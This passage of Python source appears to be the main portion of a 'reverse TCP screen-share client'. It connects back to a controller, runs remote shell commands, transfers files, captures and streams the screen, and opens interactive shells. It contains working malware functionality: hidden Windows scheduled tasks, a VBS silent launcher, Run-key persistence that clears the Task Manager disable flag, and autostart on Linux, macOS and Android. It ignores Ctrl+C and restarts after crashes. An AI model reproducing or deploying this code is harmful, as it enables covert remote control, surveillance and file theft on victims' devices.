    escaped = inner.replace('"', '""')
    content = ('Set WshShell = CreateObject("WScript.Shell")\r\n'
               'WshShell.Run "{}", 0, False\r\n').format(escaped)
    with open(vbs_path, 'w', encoding='utf-8') as f:
        f.write(content)
    return vbs_path


def _windows_command(ip, port, silent):
    """Return (execute, arguments) for the Windows launcher."""
    args = '{} {}'.format(ip, port)
    if silent:
        pyw = _pythonw_path()
        if pyw:
            return pyw, '"{}" {}'.format(SCRIPT_PATH, args)
        py = sys.executable or shutil.which('python') or 'python'
        vbs = _make_vbs(py, SCRIPT_PATH, args)
        return 'wscript.exe', '"{}"'.format(vbs)
    py = sys.executable or shutil.which('python') or 'python'
    return py, '"{}" {}'.format(SCRIPT_PATH, args)


def _register_task_powershell(task_name, execute, arguments):
    ps = '\n'.join([
        "$ErrorActionPreference = 'Stop'",
        "$exe = '{}'".format(execute.replace("'", "''")),
        "$arg = '{}'".format(arguments.replace("'", "''")),
        ("$action = New-ScheduledTaskAction -Execute $exe -Argument $arg" if arguments
         else "$action = New-ScheduledTaskAction -Execute $exe"),
        "$trigger = New-ScheduledTaskTrigger -AtLogOn -User $env:USERNAME",
        "$settings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries "
        "-DontStopIfGoingOnBatteries -StartWhenAvailable -ExecutionTimeLimit ([TimeSpan]::Zero)",
        "$principal = New-ScheduledTaskPrincipal -UserId $env:USERNAME "
        "-LogonType Interactive -RunLevel Limited",
        "Register-ScheduledTask -TaskName '{}' -Action $action -Trigger $trigger "
        "-Settings $settings -Principal $principal -Force | Out-Null".format(task_name),
    ])
    fd, path = tempfile.mkstemp(suffix='.ps1', text=True)
    try:
        with os.fdopen(fd, 'w', encoding='utf-8') as f:
            f.write(ps)
        return run_quiet(['powershell', '-NoProfile', '-ExecutionPolicy', 'Bypass', '-File', path])
    finally:
        try:
            os.remove(path)
        except OSError:
            pass


def _register_task_schtasks(task_name, execute, arguments):
    tr = '"{}" {}'.format(execute, arguments).strip()
    return run_quiet(['schtasks', '/Create', '/TN', task_name, '/TR', tr,
                      '/SC', 'ONLOGON', '/RL', 'LIMITED', '/F'])


def _windows_registry_fallback(task_name, execute, arguments):
    try:
        import winreg
    except ImportError:
        print('[-] winreg unavailable.')
        return False
    cmd = '"{}" {}'.format(execute, arguments) if arguments else '"{}"'.format(execute)
    run_key = r'Software\Microsoft\Windows\CurrentVersion\Run'
    approved_key = r'Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run'
    try:
        k = winreg.CreateKeyEx(winreg.HKEY_CURRENT_USER, run_key, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(k, task_name, 0, winreg.REG_SZ, cmd)
        winreg.CloseKey(k)
        try:                              # clear a "disabled" flag Task Manager may have set
            ka = winreg.OpenKey(winreg.HKEY_CURRENT_USER, approved_key, 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(ka, task_name, 0, winreg.REG_BINARY,
                              bytes([0x02, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]))
            winreg.CloseKey(ka)
        except FileNotFoundError:
            pass
        print('[+] Registry entry: HKCU\\{}\\{}'.format(run_key, task_name))
        return True
    except OSError as e:
        print('[-] Registry error: {}'.format(e))
        return False


def setup_windows(ip, port, silent):
    task_name = 'AutoRun_{}'.format(AUTORUN_NAME)
    execute, arguments = _windows_command(ip, port, silent)

    if _register_task_powershell(task_name, execute, arguments):
        print("[+] Scheduled Task '{}' created (hidden, at logon).".format(task_name))
    elif _register_task_schtasks(task_name, execute, arguments):
        print("[+] Scheduled Task '{}' created via schtasks.".format(task_name))
    else:
        print('[!] schtasks failed; falling back to the registry...')
        if not _windows_registry_fallback(task_name, execute, arguments):
            return False

    run_quiet(['schtasks', '/Run', '/TN', task_name])
    return True


def install_autostart(ip, port, silent=True, log_file=None):
    """Set this client up to start automatically after reboot/logon.
    Returns the setup log as text (also used as the reply to the controller)."""
    buf = io.StringIO()
    with contextlib.redirect_stdout(buf):
        print('[*] OS: {}'.format(get_os_info()))
        print('[*] Mode: {}'.format('silent (no window)' if silent else 'visible'))
        print('[*] Program: {} {} {}'.format(SCRIPT_PATH, ip, port))
        os_type = platform.system().lower()
        try:
            if is_android():
                ok = setup_android(ip, port, silent, log_file)
            elif is_ios():
                print('[-] iOS/iPadOS does not allow persistent background apps.')
                print('    Apple suspends sandboxed apps about 30 seconds after they')
                print('    leave the foreground; only a jailbroken device can persist.')
                ok = False
            elif is_macos():
                ok = setup_macos(ip, port, silent, log_file)
            elif os_type == 'linux':
                ok = setup_linux(ip, port, silent, log_file)
            elif os_type == 'windows':
                ok = setup_windows(ip, port, silent)
            else:
                print('[-] Unsupported OS: {}'.format(platform.system()))
                ok = False
        except Exception as e:
            print('[-] Unexpected error: {}'.format(e))
            ok = False
        if ok:
            print('[+] Done. The client will start automatically after reboot/logon.')
            print('    Nothing will appear on screen - you can close the terminal window.')
    return buf.getvalue().strip()


def remove_autostart():
    """Remove the auto-start entry. Returns the log as text."""
    buf = io.StringIO()
    with contextlib.redirect_stdout(buf):
        os_type = platform.system().lower()
        service_name = 'autorun-{}.service'.format(AUTORUN_NAME)
        task_name = 'AutoRun_{}'.format(AUTORUN_NAME)

        if is_android():
            path = _android_boot_path()
            if os.path.exists(path):
                try:
                    os.remove(path)
                    print('[+] Boot script removed: {}'.format(path))
                except OSError as e:
                    print('[-] Could not remove {}: {}'.format(path, e))
            else:
                print('[-] No Termux:Boot entry found.')
            print('[+] A running client stays up until closed or Termux is stopped.')

        elif is_ios():
            print('[-] Nothing to remove: iOS/iPadOS does not allow persistent')
            print('    background apps, so no autostart entry can exist (stock iOS).')

        elif is_macos():
            label = _macos_label()
            plist_path = _macos_plist_path()
            removed = False
            run_quiet(['launchctl', 'bootout', 'gui/{}/{}'.format(os.getuid(), label)])
            if os.path.exists(plist_path):
                run_quiet(['launchctl', 'unload', '-w', plist_path])
                try:
                    os.remove(plist_path)
                    removed = True
                except OSError as e:
                    print('[-] Could not remove {}: {}'.format(plist_path, e))
            print('[+] macOS autostart removed.' if removed else '[-] No LaunchAgent found.')
            print('[+] The auto-started client instance was stopped too.')

        elif os_type == 'linux':
            removed = False
            user_path = os.path.expanduser('~/.config/systemd/user/{}'.format(service_name))
            if os.path.exists(user_path):
                # --now also stops the auto-started instance, so unpersist
                # leaves nothing running in the background
                run_quiet(['systemctl', '--user', 'disable', '--now', service_name])
                try:
                    os.remove(user_path)
                    removed = True
                except OSError as e:
                    print('[-] Could not remove {}: {}'.format(user_path, e))
                run_quiet(['systemctl', '--user', 'daemon-reload'])
            system_path = '/etc/systemd/system/{}'.format(service_name)
            if os.path.exists(system_path):
                if os.geteuid() == 0:
                    run_quiet(['systemctl', 'disable', '--now', service_name])
                    try:
                        os.remove(system_path)
                        removed = True
                    except OSError as e:
                        print('[-] Could not remove {}: {}'.format(system_path, e))
                    run_quiet(['systemctl', 'daemon-reload'])
                else:
                    print('[-] A system service exists - remove it with sudo.')
            print('[+] Autostart removed.' if removed else '[-] No autostart entry found.')
            print('[+] The auto-started client instance was stopped too.')

        elif os_type == 'windows':
            run_quiet(['schtasks', '/Delete', '/TN', task_name, '/F'])
            try:
                import winreg
                for path in (r'Software\Microsoft\Windows\CurrentVersion\Run',
                             r'Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run'):
                    try:
                        k = winreg.OpenKey(winreg.HKEY_CURRENT_USER, path, 0, winreg.KEY_SET_VALUE)
                        try:
                            winreg.DeleteValue(k, task_name)
                        except FileNotFoundError:
                            pass
                        winreg.CloseKey(k)
                    except FileNotFoundError:
                        pass
            except ImportError:
                pass
            vbs = os.path.join(os.environ.get('LOCALAPPDATA') or tempfile.gettempdir(),
                               'AutoRunner', 'AutoRun_{}.vbs'.format(AUTORUN_NAME))
            try:
                os.remove(vbs)
            except OSError:
                pass
            print('[+] Windows autostart removed.')
            print('[+] A running client stays up until closed or rebooted.')

        else:
            print('[-] Unsupported OS: {}'.format(os_type))
    return buf.getvalue().strip()


def parse_args(argv):
    """client.py [controller_ip] [controller_port]
                [--persist | --remove-persist] [--visible] [--log-file PATH]"""
    ip = DEFAULT_IP
    port = DEFAULT_PORT
    persist = remove = visible = False
    log_file = None
    positional = []
    i = 0
    while i < len(argv):
        a = argv[i]
        if a == '--persist':
            persist = True
        elif a in ('--remove-persist', '--remove'):
            remove = True
        elif a == '--visible':
            visible = True
        elif a == '--log-file':
            if i + 1 < len(argv):
                i += 1
                log_file = argv[i]
            else:
                sys.stderr.write('[!] --log-file needs a path; ignoring it.\n')
        elif a.startswith('--log-file='):
            log_file = a.split('=', 1)[1] or None
        else:
            positional.append(a)
        i += 1
    if positional:
        ip = positional[0]
    if len(positional) > 1:
        try:
            port = int(positional[1])
        except ValueError:
            pass
    return ip, port, persist, remove, visible, log_file


def main():
    _immune_to_ctrl_c()          # Ctrl+C is never a way to stop this client
    if any(a in ('-h', '--help') for a in sys.argv[1:]):
        print('usage: python client.py [controller_ip] [controller_port]')
        print('       --persist          install auto-start (silent) for this client')
        print('       --visible          with --persist: show a window instead')
        print('       --log-file PATH    with --persist: keep a log file')
        print('       --remove-persist   remove the auto-start entry')
        return

    target_ip, target_port, do_persist, do_remove, visible, log_file = parse_args(sys.argv[1:])

    print("[+] Reverse TCP screen-share client v19")

    if do_remove:
        print(remove_autostart())
        return

    if do_persist:
        print(install_autostart(target_ip, target_port, silent=not visible, log_file=log_file))
        return

    if is_ios():
        print("[i] iOS/iPadOS: stock iOS suspends sandboxed apps ~30s after they leave")
        print("    the foreground and gives them no way to capture the screen. This")
        print("    client is only fully usable on a jailbroken device with a real")
        print("    Python (pty + screencapture). Files may still transfer on stock iOS.")

    if is_android():
        api = android_api()
        print("[i] Android/Termux{}: shell, commands and files work without root.".format(
            ' (API {})'.format(api) if api else ''))
        print("    Screen capture needs root (su + screencap). Keep Termux unrestricted;")
        print("    Android 12+ may kill background processes (run termux-wake-lock;")
        print("    Android 14+: allow 'Disable child process restrictions' for Termux).")
        if api >= 37:
            print("    Android 17+: the Play Store Termux build must be allowed Nearby")
            print("    devices / local network; the F-Droid build does not need it.")

    ensure_dependencies()

    if is_android():
        # Keep the Termux process alive while this client runs; released on exit.
        _android_wake_lock(True)
        atexit.register(_android_wake_lock, False)

    # Persistent working directory: survives reconnects
    current_dir = os.getcwd()

    # Outer loop: runs until this program is closed or the controller says exit
    while True:
        # Keep trying until the controller is up, so the start order doesn't
        # matter. This loop never gives up: only 'exit' from the controller or
        # closing this program stops the client.
        failures = 0
        while True:
            try:
                # create_connection covers DNS and every address family, and the
                # timeout bounds a dead/silent host: a plain connect() could sit
                # in the kernel for ~127 s, which looked like a frozen client.
                client_socket = socket.create_connection(
                    (target_ip, target_port), timeout=CONNECT_TIMEOUT)
                client_socket.settimeout(None)
                break
            except Exception as e:
                failures += 1
                if failures == 1 or failures % 10 == 0:
                    print("[!] Controller not reachable at {}:{} ({}), retrying every {}s...".format(
                        target_ip, target_port, e, RETRY_DELAY))
                time.sleep(RETRY_DELAY)

        print("[+] Reverse TCP shell connected to {}:{}".format(target_ip, target_port))
        _tune_socket(client_socket)      # fast reconnect when this controller dies

        # Tell the controller what this machine has (OS, session, capture tools)
        # so it can explain any missing dependency with exact install commands.
        try:
            send_msg(client_socket, {'type': 'hello', 'env': environment_report()})
        except OSError:
            pass

        # Serve commands until the controller goes away (then reconnect and wait)
        stop = False
        del DEFERRED[:]                      # nothing left over from a dead session
        with CANCELED_LOCK:
            CANCELED.clear()
        try:
            while True:
                if DEFERRED:
                    # Requests read while a command was running - in order.
                    msg = DEFERRED.pop(0)
                else:
                    msg = recv_msg(client_socket)
                if msg is None:              # controller closed the connection
                    print("[!] Controller closed the connection. Reconnecting...")
                    break

                mtype = msg.get('type')
                req_id = msg.get('id')

                # The controller stopped this request (Ctrl+Z / 'stop') before we
                # got to it: answer and move on instead of running it.
                if mtype not in ('exit', 'hello', 'cancel', 'cmd_kill', 'screenshare_stop') \
                        and _is_canceled(req_id):
                    why = _forget_canceled(req_id) or 'Ctrl+Z'
                    send_msg(client_socket, {'type': 'output', 'id': req_id,
                                             'data': '[client] canceled ({})'.format(why)})
                    continue

                if mtype == 'exit':
                    stop_stream(wait=0.5)
                    try:
                        send_msg(client_socket, {'type': 'output', 'id': req_id,
                                                 'data': '[client] shutting down'})
                    except OSError:
                        pass
                    stop = True
                    break

                if mtype == 'cmd':
                    command = msg.get('data', '')
                    if not command.strip():
                        continue

                    cd_result = change_dir(command, current_dir)
                    if cd_result is not None:
                        current_dir, output = cd_result
                        send_msg(client_socket, {'type': 'output', 'id': req_id,
                                                 'data': output if output is not None else '[no output]'})
                        continue

                    try:
                        text, stop_requested = run_command(client_socket, command, current_dir, req_id)
                    except Exception as e:
                        text, stop_requested = 'command failed: {}'.format(e), False
                    if not text:
                        text = '[no output]'
                    send_msg(client_socket, {'type': 'output', 'id': req_id, 'data': text})
                    if stop_requested:
                        stop = True
                        break
                    continue

                if mtype in ('cmd_kill', 'cancel'):
                    continue                # nothing running: nothing to stop

                if mtype == 'download':
                    path = os.path.expanduser(msg.get('path', ''))
                    real_path = path if os.path.isabs(path) else os.path.join(current_dir, path)
                    try:
                        info = os.stat(real_path)
                        if not stat.S_ISREG(info.st_mode):
                            raise OSError('not a regular file')
                        if info.st_size > MAX_FILE:
                            send_msg(client_socket, {'type': 'error', 'id': req_id, 'data': 'File too large (max {} MB)'.format(MAX_FILE // (1024 * 1024))})
                            continue
                        with open(real_path, 'rb') as f:
                            # Bounded even if the file grows while we read it
                            # (a 50 MB cap used to be checked only before opening).
                            raw = f.read(MAX_FILE + 1)
                        if len(raw) > MAX_FILE:
                            send_msg(client_socket, {'type': 'error', 'id': req_id, 'data': 'File too large (max {} MB)'.format(MAX_FILE // (1024 * 1024))})
                            continue
                        data = base64.b64encode(raw).decode('ascii')
                        send_msg(client_socket, {'type': 'file', 'id': req_id, 'name': os.path.basename(real_path), 'data': data})
                    except Exception as e:
                        send_msg(client_socket, {'type': 'error', 'id': req_id, 'data': 'download failed: {}'.format(e)})
                    continue

                if mtype == 'upload':
                    name = os.path.expanduser(msg.get('name', 'uploaded.bin'))
                    dest = name if os.path.isabs(name) else os.path.join(current_dir, name)
                    try:
                        encoded = msg.get('data', '')
                        if not isinstance(encoded, str):
                            raise ValueError('upload data is not text')
                        decoded_size = (len(encoded) * 3) // 4
                        if decoded_size > MAX_FILE + 3:
                            raise ValueError('File too large (max {} MB)'.format(
                                MAX_FILE // (1024 * 1024)))
                        data = base64.b64decode(encoded)
                        if len(data) > MAX_FILE:
                            raise ValueError('File too large (max {} MB)'.format(
                                MAX_FILE // (1024 * 1024)))
                        with open(dest, 'wb') as f:
                            f.write(data)
                        send_msg(client_socket, {'type': 'output', 'id': req_id, 'data': 'Saved to {} ({} bytes)'.format(dest, len(data))})
                    except Exception as e:
                        send_msg(client_socket, {'type': 'error', 'id': req_id, 'data': 'upload failed: {}'.format(e)})
                    continue

                if mtype == 'screenshot':
                    take_screenshot(client_socket, req_id)
                    continue

                if mtype == 'persist':
                    try:
                        report = install_autostart(target_ip, target_port)
                    except Exception as e:
                        report = 'persist failed: {}'.format(e)
                    send_msg(client_socket, {'type': 'output', 'id': req_id, 'data': report})
                    continue

                if mtype == 'unpersist':
                    try:
                        report = remove_autostart()
                    except Exception as e:
                        report = 'unpersist failed: {}'.format(e)
                    send_msg(client_socket, {'type': 'output', 'id': req_id, 'data': report})
                    continue

                if mtype == 'screenshare':
                    # One share at a time: stop the previous one, then stream in
                    # a thread so commands keep working while the screen is live.
                    stop_stream()
                    stream_stop = threading.Event()
                    stream_thread = threading.Thread(
                        target=_stream_worker,
                        args=(client_socket, msg.get('fps'), stream_stop, req_id),
                        name='screenshare', daemon=True)
                    with STREAM_LOCK:
                        STREAM['stop'] = stream_stop
                        STREAM['thread'] = stream_thread
                        STREAM['id'] = req_id
                    print('[+] Screen share started ({} fps)'.format(msg.get('fps') or 'max'))
                    try:
                        stream_thread.start()
                    except Exception as e:
                        # A thread that never started must not leave STREAM
                        # thinking a share is running (which blocked every
                        # later screenshare).
                        with STREAM_LOCK:
                            STREAM['stop'] = None
                            STREAM['thread'] = None
                            STREAM['id'] = None
                        send_msg(client_socket, {'type': 'error', 'id': req_id,
                                                 'data': 'screenshare: {}'.format(e)})
                    continue

                if mtype == 'screenshare_stop':
                    if stop_stream():
                        print('[+] Screen share stopped.')
                    else:
                        send_msg(client_socket, {'type': 'output', 'id': req_id,
                                                 'data': '[client] no screen share is running'})
                    continue

                if mtype == 'shell':
                    try:
                        shell_port = int(msg.get('port'))
                    except (TypeError, ValueError):
                        send_msg(client_socket, {'type': 'error', 'id': req_id,
                                                 'data': 'shell: controller sent no valid port'})
                        continue
                    start_interactive_shell(client_socket, target_ip, shell_port, req_id)
                    continue

                send_msg(client_socket, {'type': 'error', 'id': req_id,
                                         'data': 'unknown message type: {}'.format(mtype)})
        except OSError as e:
            print("[!] Connection error: {}. Reconnecting...".format(e))
        except Exception as e:                  # never let one bad message kill us
            print("[!] Unexpected error: {}. Reconnecting...".format(e))

        stop_stream(wait=0.5)                   # a share cannot outlive its socket
        stop_shell()                            # ... and neither can an old shell
        try:
            client_socket.shutdown(socket.SHUT_RDWR)   # wakes a parked send/recv
        except OSError:
            pass
        try:
            client_socket.close()
        except OSError:
            pass

        if stop:
            print("[+] Controller requested shutdown. Exiting.")
            break
        # otherwise: wait one retry interval, so a peer that accepts and then
        # immediately drops the connection cannot be hammered in a hot loop
        time.sleep(RETRY_DELAY)


if __name__ == "__main__":
    # Ctrl+C must never end this client: keep running (and keep trying to
    # reach the controller) no matter how often it is pressed.
    _immune_to_ctrl_c()
    # The client is meant to stay alive: a crash restarts it unless 'exit'
    # was requested from the controller (then main() returns normally).
    while True:
        try:
            main()
            break
        except KeyboardInterrupt:
            print("[i] Ctrl+C ignored - still running, still reconnecting.")
            continue
        except Exception as e:
            print("[!] Unexpected fatal error: {} - restarting in {}s...".format(e, RETRY_DELAY))
            time.sleep(RETRY_DELAY)
